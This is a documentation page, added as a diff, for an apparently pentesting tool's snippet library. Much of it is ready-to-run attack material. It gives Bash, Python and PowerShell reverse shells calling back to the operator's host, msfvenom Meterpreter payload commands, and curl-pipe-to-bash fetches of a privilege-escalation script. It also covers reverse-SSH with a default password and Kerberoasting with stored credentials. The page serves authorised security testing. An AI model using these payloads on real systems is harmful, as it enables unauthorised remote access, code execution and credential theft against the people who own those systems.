@@ -1,0 +1,385 @@
+---
+title: Snippets
+description: Use and customize the snippet library for reverse shells, privilege escalation, and common pentesting commands
+---
+
+## Overview
+
+QtRecon includes a comprehensive snippet library containing reverse shells, privilege escalation techniques, and common pentesting commands. Snippets support variable substitution for your local IP and port, making them immediately usable during engagements.
+
+## Accessing snippets
+
+Snippets are available through the main interface:
+
+<Steps>
+  <Step title="Open snippets window">
+    Navigate to **Tools** > **Snippets** in the main menu
+  </Step>
+
+  <Step title="Browse categories">
+    Snippets are organized into categories like "Reverse shells", "Linux", and "Windows"
+  </Step>
+
+  <Step title="Select a snippet">
+    Click on a snippet to view its contents. Variable placeholders like `%%%LHOST%%%` are highlighted.
+  </Step>
+
+  <Step title="Copy to clipboard">
+    Click **Copy** to copy the snippet with variables replaced by your current values
+  </Step>
+</Steps>
+
+## Built-in snippet categories
+
+QtRecon's default configuration includes three main snippet categories:
+
+### Reverse shells
+
+Comprehensive collection of reverse shell techniques for multiple languages and environments:
+
+- **Bash TCP/UDP**: Traditional bash reverse shells
+- **Python**: IPv4 variants with different obfuscation levels
+- **PHP**: Multiple execution methods (exec, shell_exec, system, etc.)
+- **PowerShell**: Windows reverse shells
+- **Netcat**: Traditional, OpenBSD, and BusyBox variants
+- **Language-specific**: Perl, Ruby, Golang, Java
+- **Metasploit**: msfvenom payload generation commands
+
+### Linux
+
+Common Linux post-exploitation commands:
+
+- HTTP file transfer (wget, curl)
+- TTY shell upgrades
+- Reverse SSH techniques
+
+### Windows
+
+Windows-specific techniques:
+
+- SMB/HTTP file transfer
+- Privilege escalation tools (Seatbelt)
+- User creation and admin access
+- Mimikatz commands
+- Remote Desktop enablement
+- Security lowering techniques
+
+## Variable substitution
+
+Snippets use the same variable system as custom tools:
+
+### LHOST and LPORT
+
+The most common variables in snippets:
+
+| Variable | Description | Configuration |
+|----------|-------------|---------------|
+| `%%%LHOST%%%` | Your local IP address | Auto-detected from `preferred_interfaces` |
+| `%%%LPORT%%%` | Your listening port | Set in `preferred_lport` |
+
+### Preferred interfaces configuration
+
+```json
+"user_prefs": {
+    "preferred_interfaces": ["tun0", "vpn0", "eth0"],
+    "preferred_lport": 8444
+}
+```
+
+QtRecon checks interfaces in order and uses the first one with an active IP address.
+
+<Note>
+If you're connected via VPN, make sure `tun0` or your VPN interface is first in `preferred_interfaces` so snippets use the correct IP.
+</Note>
+
+## Example snippets
+
+<Accordion title="Bash TCP reverse shell">
+
+```bash
+bash -i >& /dev/tcp/%%%LHOST%%%/%%%LPORT%%% 0>&1
+```
+
+With variables replaced:
+
+```bash
+bash -i >& /dev/tcp/10.10.14.5/8444 0>&1
+```
+
+</Accordion>
+
+<Accordion title="Python reverse shell (IPv4)">
+
+```python
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%%%LHOST%%%",%%%LPORT%%%));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+```
+
+With variables replaced:
+
+```python
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",8444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+```
+
+</Accordion>
+
+<Accordion title="PowerShell reverse shell">
+
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('%%%LHOST%%%',%%%LPORT%%%);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+</Accordion>
+
+<Accordion title="msfvenom payload generation">
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=%%%LHOST%%% LPORT=%%%LPORT%%% -f exe > reverse.exe
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="%%%LHOST%%%" LPORT=%%%LPORT%%% -f elf > shell.elf
+msfvenom -p php/meterpreter_reverse_tcp LHOST="%%%LHOST%%%" LPORT=%%%LPORT%%% -f raw > shell.php
+```
+
+</Accordion>
+
+<Accordion title="Linux HTTP file transfer">
+
+Server side:
+```bash
+sudo python -m http.server 80 --directory /usr/share/linux-binaries/PEASS-ng/linPEAS/
+```
+
+Client side:
+```bash
+cd /tmp/; wget http://%%%LHOST%%%/linpeas.sh -O /tmp/l.sh; bash /tmp/l.sh
+curl http://%%%LHOST%%%/linpeas.sh | bash
+```
+
+</Accordion>
+
+<Accordion title="Windows SMB file transfer">
+
+Server side:
+```bash
+sudo smbserver.py -smb2support share /usr/share/windows-binaries/priv-esc
+```
+
+Client side:
+```cmd
+copy \\%%%LHOST%%%\share\seatbelt.exe seatbelt.exe
+```
+
+</Accordion>
+
+## Snippet structure in configuration
+
+Snippets are stored in `conf.json` as nested arrays:
+
+```json
+"snippets": {
+    "Reverse shells": [
+        "Launching the reverse shell",
+        [
+            "socat -dd tcp-listen:%%%LPORT%%%,reuseaddr,fork,bind=%%%LHOST%%% stdio"
+        ],
+        "Bash TCP",
+        [
+            "bash -i >& /dev/tcp/%%%LHOST%%%/%%%LPORT%%% 0>&1",
+            "0<&196;exec 196<>/dev/tcp/%%%LHOST%%%/%%%LPORT%%%; sh <&196 >&196 2>&196"
+        ],
+        "python",
+        [
+            "IPv4",
+            [
+                "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
+            ],
+            "IPv4 (No Spaces)",
+            [
+                "python3 -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
+            ]
+        ]
+    ]
+}
+```
+
+### Structure explanation
+
+Snippets follow a hierarchical pattern:
+
+1. **Category name**: Top-level key (e.g., `"Reverse shells"`)
+2. **Subcategory**: String followed by array of snippets
+3. **Sub-subcategory**: Can nest multiple levels
+4. **Actual snippets**: Final array elements containing the commands
+
+<Tip>
+You can create deeply nested snippet hierarchies for complex organization. For example, reverse shells are organized by language, then by variant (IPv4, IPv4 No Spaces, etc.).
+</Tip>
+
+## Adding custom snippets
+
+You can add your own snippets through the settings:
+
+<Steps>
+  <Step title="Open settings">
+    Navigate to **Edit** > **Settings** > **Snippets** tab
+  </Step>
+
+  <Step title="Edit JSON">
+    The snippets configuration is displayed as editable JSON. Add your snippets following the nested array structure:
+    
+    ```json
+    "My Custom Category": [
+        "Subcategory Name",
+        [
+            "command1 %%%LHOST%%% %%%LPORT%%%",
+            "command2 %%%LHOST%%% %%%LPORT%%%"
+        ]
+    ]
+    ```
+  </Step>
+
+  <Step title="Validate and save">
+    Click **OK**. QtRecon will validate the JSON syntax before saving.
+  </Step>
+</Steps>
+
+<Warning>
+Snippets must be valid JSON. If you introduce syntax errors, QtRecon will display an error message and prevent saving until corrected.
+</Warning>
+
+## Snippet best practices
+
+<Accordion title="Use descriptive categories">
+
+Organize snippets logically by:
+- Target OS (Linux, Windows, macOS)
+- Technique type (Reverse shells, File transfer, Privilege escalation)
+- Tool category (Web, Database, Active Directory)
+
+This makes finding the right snippet quick during time-pressured engagements.
+
+</Accordion>
+
+<Accordion title="Include both client and server commands">
+
+For techniques requiring both attacker and victim commands (like file transfers), include both:
+
+```json
+"Get file from HTTP server",
+[
+    "sudo python -m http.server 80 --directory /usr/share/linux-binaries/PEASS-ng/linPEAS/",
+    "cd /tmp/; wget http://%%%LHOST%%%/linpeas.sh -O /tmp/l.sh; bash /tmp/l.sh",
+    "curl http://%%%LHOST%%%/linpeas.sh | bash"
+]
+```
+
+</Accordion>
+
+<Accordion title="Document unusual syntax">
+
+For complex or unusual commands, add comments or explanatory text:
+
+```json
+"Reverse SSH (https://github.com/Fahrj/reverse-ssh)",
+[
+    "Bind SSH",
+    [
+        "victim$ ./reverse-ssh",
+        "attacker$ ssh -p 31337 <RHOST> #(default password: letmeinbrudipls)"
+    ],
+    "Reverse SSH",
+    [
+        "attacker$ ./reverse-ssh -v -N -l :%%%LPORT%%%",
+        "victim$ ./reverse-ssh -p %%%LPORT%%% -b 8888 %%%LHOST%%%",
+        "attacker$ ssh -o UserKnownHostsFile=/dev/null -p 8888 127.0.0.1"
+    ]
+]
+```
+
+</Accordion>
+
+<Accordion title="Keep attributions">
+
+If you copy snippets from public resources, keep attribution:
+
+```json
+"Credits",
+[
+    "PayloadsAllTheThings, https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"
+]
+```
+
+This helps track sources and gives credit to original authors.
+
+</Accordion>
+
+## Advanced snippet organization
+
+For complex snippet libraries, use multiple nesting levels:
+
+```json
+"snippets": {
+    "Active Directory": [
+        "Enumeration",
+        [
+            "BloodHound",
+            [
+                "bloodhound-python -u %%%USERNAME%%% -p %%%PASSWORD%%% -d %%%DOMAIN%%% -ns %%%IP%%% -c all"
+            ],
+            "LDAP",
+            [
+                "ldapsearch -x -H ldap://%%%IP%%% -D '%%%USERNAME%%%@%%%DOMAIN%%%' -w '%%%PASSWORD%%%' -b 'DC=corp,DC=local'"
+            ]
+        ],
+        "Exploitation",
+        [
+            "Kerberoasting",
+            [
+                "GetUserSPNs.py -request -dc-ip %%%IP%%% %%%DOMAIN%%%/%%%USERNAME%%%:%%%PASSWORD%%%"
+            ]
+        ]
+    ]
+}
+```
+
+## Variable reference
+
+All variables available in snippets:
+
+| Variable | Source | Example |
+|----------|--------|----------|
+| `%%%LHOST%%%` | First active interface from `preferred_interfaces` | `10.10.14.5` |
+| `%%%LPORT%%%` | `user_prefs.preferred_lport` | `8444` |
+| `%%%IP%%%` | Selected host IP | `192.168.1.100` |
+| `%%%HOSTNAME%%%` | Selected host hostname | `web01.corp.local` |
+| `%%%PORT%%%` | Selected port | `443` |
+| `%%%PROTO%%%` | Protocol (http/https) | `https` |
+| `%%%DOMAIN%%%` | Domain from credentials | `CORP` |
+| `%%%USERNAME%%%` | Username from credentials | `administrator` |
+| `%%%PASSWORD%%%` | Password from credentials | `P@ssw0rd123` |
+| `%%%HASH%%%` | Hash from credentials | `8846f7eaee8fb117ad06bdd830b7586c` |
+| Custom variables | `user_variables` section | Defined by you |
+
+<Note>
+Not all variables are available in all contexts. For example, `%%%PORT%%%` is only available when a port is selected, and credential variables require stored credentials.
+</Note>
+
+## Exporting and sharing snippets
+
+Snippets are stored in `conf.json`, making them easy to share:
+
+<Steps>
+  <Step title="Export your configuration">
+    Copy your `conf.json` file or just the `snippets` section
+  </Step>
+
+  <Step title="Share with team">
+    Team members can copy the `snippets` section into their own `conf.json`
+  </Step>
+
+  <Step title="Version control">
+    Store `conf.json` in a private Git repository for team synchronization
+  </Step>
+</Steps>
+
+<Tip>
+Create a separate `snippets-library.json` file with just the snippets section, then use a script to merge it into individual `conf.json` files. This allows centralized snippet management for teams.
+</Tip>
